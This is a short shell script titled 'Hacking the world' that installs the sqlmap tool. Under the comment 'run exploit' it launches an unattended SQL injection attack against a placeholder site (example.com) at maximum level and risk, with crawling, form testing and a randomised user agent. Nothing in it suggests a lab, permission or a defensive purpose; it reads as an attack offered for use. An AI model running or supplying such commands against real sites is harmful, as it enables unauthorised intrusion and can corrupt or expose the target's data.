#!/bin/sh
# Hacking the world

# Install
pip3 install sqlmap

# run exploit
sqlmap -u "http://example.com/" --crawl=5 --random-agent --batch --forms --threads=5 --level=5 --risk=3
